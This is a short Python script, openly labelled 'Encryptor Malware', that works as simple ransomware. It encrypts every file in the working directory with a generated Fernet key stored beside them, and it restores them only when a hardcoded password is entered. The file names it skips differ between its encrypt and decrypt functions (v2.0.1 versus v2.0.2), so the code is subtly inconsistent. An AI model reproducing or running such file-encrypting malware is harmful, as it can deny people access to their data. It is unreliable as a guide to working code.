import os
from cryptography.fernet import Fernet

def file_encrypt():
    files = []

    for file in os.listdir():
        if file == "malware.key" or file == "Encryptor_Malware_[v2.0.1].py" or file == "README.txt":
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("malware.key", "wb") as key_file:
        key_file.write(key)

    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)

def file_decrypt():
    files = []

    for file in os.listdir():
        if file == "malware.key" or file == "Encryptor_Malware_[v2.0.2].py" or file == "README.txt":
            continue
        if os.path.isfile(file):
            files.append(file)

    with open("malware.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)
    
    os.remove("malware.key")

def clear_term():
    os.system('cls')

def main():
    while True:
        clear_term()
        print(f"{purple}ENCRYPTOR MALWARE [v2.0.1]\n- By Alejandro Romeo{reset}\n")
        if os.path.exists("malware.key"):
            user_input = input("Enter the password to decrypt your files\n")
            if user_input == password:
                file_decrypt()
                print(f"{green}Your data has been restored!{reset}")
                input("Press ENTER to exit")
                quit()

            if user_input != password:
                print(f"{red}Incorrect password.{reset}")
                input("Press ENTER to try again")

        else:
            file_encrypt()
            print("All your files have been encrypted")
            input("Press ENTER to decrypt\n")

red = "\033[31m"
green = "\033[32m"
purple = "\033[35m"
reset = "\033[0m"
password = "T/0tNddy<<[F"

if __name__ == "__main__":
    main()
